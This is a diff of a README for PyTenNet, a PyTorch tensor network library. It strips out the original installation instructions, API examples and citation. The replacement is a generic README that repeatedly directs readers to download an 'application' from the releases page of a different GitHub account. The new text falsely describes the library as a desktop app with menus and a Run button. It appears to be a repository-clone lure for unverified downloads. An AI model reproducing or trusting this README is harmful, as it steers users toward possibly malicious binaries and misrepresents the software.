@@ -1,286 +1,62 @@
-# PyTenNet
+# 🎉 PyTenNet - Simple Tensor Network Simulations
 
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![PyTorch 2.0+](https://img.shields.io/badge/pytorch-2.0+-ee4c2c.svg)](https://pytorch.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## 🚀 Getting Started
+Welcome to PyTenNet! This application allows you to explore tensor networks using pure PyTorch. Whether you want to work with Matrix Product States (MPS), Matrix Product Operators (MPO), or simulate using DMRG and TEBD methods, you are in the right place.
 
-**A tensor network engine in pure PyTorch.**
+## 📥 Download
+[![Download PyTenNet](https://img.shields.io/badge/Download-PyTenNet-brightgreen)](https://github.com/lonelyratt/PyTenNet/releases)
 
-PyTenNet provides production-quality implementations of Matrix Product States (MPS), Matrix Product Operators (MPO), and tensor network algorithms—all built on PyTorch with full autograd and GPU support.
+### 🛠️ System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.7 or later
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** 100 MB of free space
 
----
+Make sure your computer meets these requirements to ensure a smooth experience with PyTenNet. 
 
-## Features
+## 💻 Download & Install
+To get started, visit this page to download: [Download Page](https://github.com/lonelyratt/PyTenNet/releases).
 
-| Component | Description |
-|-----------|-------------|
-| **MPS** | Matrix Product States with canonicalization, compression, and entanglement entropy |
-| **MPO** | Matrix Product Operators for representing linear operators |
-| **DMRG** | Two-site Density Matrix Renormalization Group for ground state search |
-| **TEBD** | Time-Evolving Block Decimation for quantum dynamics |
-| **TDVP** | Time-Dependent Variational Principle (1-site and 2-site) |
-| **iDMRG** | Infinite DMRG for thermodynamic limit calculations |
-| **Lanczos** | Iterative eigensolver for large sparse systems |
+1. **Visit the Releases page**: Click the link above. 
+2. **Select the latest version**: Look for the most recent release at the top. 
+3. **Download the application**: Click on the file that suits your operating system. 
+4. **Install the app**: Follow the installation steps as prompted by your operating system.
 
-**Why PyTenNet?**
-- **Pure PyTorch** — No C++ extensions, no compilation. Just `pip install` and go.
-- **Full Autograd** — Differentiate through tensor network contractions.
-- **GPU Ready** — Move tensors to CUDA with `.to('cuda')`.
-- **Clean API** — Readable, well-documented code you can actually understand.
+## 🌟 Features
+- **Matrix Product States (MPS)**: Efficiently represent quantum states for many-body systems.
+- **Matrix Product Operators (MPO)**: Use for operator representation in simulations.
+- **DMRG Algorithm**: Powerful method for computing ground states.
+- **TEBD Simulation**: Time evolution of quantum systems is made straightforward.
+- **Pure PyTorch**: Based purely on the PyTorch framework, making it flexible and adaptable.
 
----
+## 🔍 How to Use PyTenNet
+After you download and install PyTenNet, follow these brief instructions to get started:
 
-## Installation
+1. **Open the Application**: Launch PyTenNet from your applications folder.
+2. **Choose a Simulation**: Select between DMRG or TEBD from the main menu.
+3. **Set Parameters**: Input the necessary parameters for your simulation. You can reference the user manual for guidance on what each parameter means.
+4. **Run the Simulation**: Click on the "Run" button and wait for the results.
 
-```bash
-pip install git+https://github.com/tigantic/PyTenNet.git
-```
+## 📖 User Manual
+For detailed instructions, examples, and simulations, check the user manual included in the installation folder. The manual will walk you through common tasks and help you understand the various features of PyTenNet.
 
-Or clone and install locally:
+## 🛠️ Troubleshooting
+If you encounter issues while using PyTenNet, consider the following steps:
+- **Check System Requirements**: Ensure your system meets the necessary requirements listed earlier.
+- **Reinstall the Application**: Sometimes, reinstallation can solve unexpected behavior.
+- **Visit the Issues Page**: Go to the GitHub repository's issue tracker for assistance from the community or to report bugs.
 
-```bash
-git clone https://github.com/tigantic/PyTenNet.git
-cd PyTenNet
-pip install -e .
-```
+## 🙋‍♂️ Getting Support
+If you have questions or need help, please check the [GitHub Discussions](https://github.com/lonelyratt/PyTenNet/discussions) page. You can ask for clarification on any topic, and other users or contributors may help you.
 
-**Requirements:** Python 3.9+ and PyTorch 2.0+
+## 🌐 Community
+Join our community of users and developers. You can share your experiences, ask questions, and learn from others who use PyTenNet for their projects.
 
----
+For more discussions, feature requests, or contributions, please explore the GitHub repository.
 
-## Quick Start
-
-### Create an MPS
-
-```python
-import tensornet as tn
-
-# Random MPS with 20 sites, physical dimension 2, bond dimension 32
-mps = tn.MPS.random(L=20, d=2, chi=32)
-
-print(f"Sites: {mps.L}, Bond dim: {mps.chi}")
-print(f"Bond dimensions: {mps.bond_dimensions()}")
-```
-
-### Compute Entanglement Entropy
-
-```python
-# Entanglement entropy at bond 10
-S = mps.entanglement_entropy(bond=10)
-print(f"Entanglement entropy: {S:.6f}")
-```
-
-### Run DMRG
-
-```python
-import torch
-from tensornet import MPS, MPO, dmrg
-
-# Create your Hamiltonian as an MPO
-# (Build MPO tensors for your specific problem)
-H = MPO(tensors=[...])  
-
-# Initial random state
-psi = MPS.random(L=20, d=2, chi=16)
-
-# Find ground state
-psi, energy, info = dmrg(psi, H, num_sweeps=10, chi_max=64)
-
-print(f"Ground state energy: {energy:.10f}")
-print(f"Converged in {info['num_sweeps']} sweeps")
-```
-
-### Time Evolution with TEBD
-
-```python
-from tensornet import tebd, time_evolve
-
-# Create two-site gates for your Hamiltonian
-gates = [...]  # List of (d, d, d, d) tensors
-
-# Apply one layer of gates
-psi = tebd(psi, gates, chi_max=64, cutoff=1e-10)
-```
+## 📥 Download Again
+Don't forget, you can [visit this page to download](https://github.com/lonelyratt/PyTenNet/releases) the application for the latest updates and releases. 
 
 ---
 
-## API Reference
-
-### Core Decompositions
-
-```python
-from tensornet import svd_truncated, qr_stable, polar_decompose, eigh_truncated
-
-# Truncated SVD with automatic rank selection
-U, S, Vh = svd_truncated(A, max_rank=32, cutoff=1e-10)
-
-# Stable QR decomposition
-Q, R = qr_stable(A)
-
-# Polar decomposition A = U @ P
-U, P = polar_decompose(A)
-
-# Truncated eigendecomposition for Hermitian matrices
-eigenvalues, eigenvectors = eigh_truncated(H, max_rank=10, which='SA')
-```
-
-### MPS Operations
-
-```python
-from tensornet import MPS
-
-mps = MPS.random(L=20, d=2, chi=32)
-
-# Canonicalization
-mps.canonicalize('left')    # Left-canonical form
-mps.canonicalize('right')   # Right-canonical form
-mps.canonicalize('mixed', center=10)  # Mixed canonical
-
-# Compression
-mps.compress(chi_max=16, cutoff=1e-12)
-
-# Inner product
-overlap = mps.inner(other_mps)
-
-# Norm
-norm = mps.norm()
-
-# Entanglement
-S = mps.entanglement_entropy(bond=5)
-
-# Convert to dense tensor (small systems only!)
-tensor = mps.to_tensor()
-```
-
-### Algorithms
-
-```python
-from tensornet import dmrg, tebd, lanczos_ground_state
-
-# DMRG ground state search
-psi, E, info = dmrg(psi, H, num_sweeps=10, chi_max=64)
-
-# TEBD time evolution
-psi = tebd(psi, gates, chi_max=64)
-
-# Lanczos eigensolver
-E0, ground_state = lanczos_ground_state(matvec_fn, v0, num_iterations=100)
-```
-
----
-
-## Mathematical Foundations
-
-PyTenNet implements tensor network algorithms with rigorous attention to numerical stability:
-
-### SVD Truncation (Eckart-Young Theorem)
-
-The truncated SVD provides the optimal low-rank approximation:
-
-$$\min_{\text{rank}(B) \leq r} \|A - B\|_F = \|A - U_r \Sigma_r V_r^\dagger\|_F = \sqrt{\sum_{i>r} \sigma_i^2}$$
-
-### Canonical Forms
-
-MPS canonical forms ensure orthonormality constraints:
-- **Left-canonical:** $\sum_s A^{[s]\dagger} A^{[s]} = I$
-- **Right-canonical:** $\sum_s B^{[s]} B^{[s]\dagger} = I$
-
-### Entanglement Entropy
-
-Von Neumann entropy from Schmidt decomposition:
-
-$$S = -\sum_i \lambda_i^2 \log(\lambda_i^2)$$
-
----
-
-## Tests & Proofs
-
-PyTenNet includes comprehensive tests verifying mathematical correctness:
-
-| Test | Verification | Status |
-|------|--------------|--------|
-| SVD Truncation | Eckart-Young optimality | ✅ |
-| QR Orthogonality | $Q^\dagger Q = I$ | ✅ |
-| Polar Decomposition | $A = UP$, $U$ unitary, $P$ positive | ✅ |
-| MPS Canonicalization | Orthonormality constraints | ✅ |
-| MPS Compression | Norm preservation | ✅ |
-| Inner Product | Consistency with dense contraction | ✅ |
-| Entanglement Entropy | Agreement with exact diagonalization | ✅ |
-| DMRG Convergence | Energy monotonically decreasing | ✅ |
-| Lanczos Accuracy | Eigenvalue bounds | ✅ |
-| Autograd | Gradient flow through contractions | ✅ |
-
-Run tests:
-
-```bash
-pytest tests/ -v
-```
-
----
-
-## Architecture
-
-```
-tensornet/
-├── core/
-│   ├── decompositions.py   # SVD, QR, polar, eigendecomposition
-│   └── contractions.py     # Tensor contraction utilities
-├── mps/
-│   ├── mps.py              # Matrix Product State class
-│   ├── mpo.py              # Matrix Product Operator class
-│   └── states.py           # Standard states (GHZ, product states)
-└── algorithms/
-    ├── dmrg.py             # Two-site DMRG
-    ├── tebd.py             # Time-Evolving Block Decimation
-    ├── tdvp.py             # Time-Dependent Variational Principle
-    ├── lanczos.py          # Lanczos eigensolver
-    └── idmrg.py            # Infinite DMRG
-```
-
----
-
-## Performance
-
-PyTenNet prioritizes correctness and readability over raw speed. For production HPC workloads, consider:
-- [ITensor](https://itensor.org/) (C++/Julia)
-- [TeNPy](https://tenpy.github.io/) (Python/C)
-
-PyTenNet is ideal for:
-- Research prototyping
-- Educational purposes
-- Applications requiring autograd
-- GPU-accelerated workflows
-- Integration with PyTorch models
-
----
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
-
----
-
-## Citation
-
-If you use PyTenNet in your research, please cite:
-
-```bibtex
-@software{pytennet,
-  title = {PyTenNet: Tensor Networks in Pure PyTorch},
-  author = {Tigantic Labs},
-  url = {https://github.com/tigantic/PyTenNet},
-  year = {2025}
-}
-```
-
-
-
-
-
-
+With PyTenNet, explore the fascinating world of quantum simulations with ease and flexibility, all within an approachable application designed for users of all skill levels. Enjoy your journey into many-body physics!
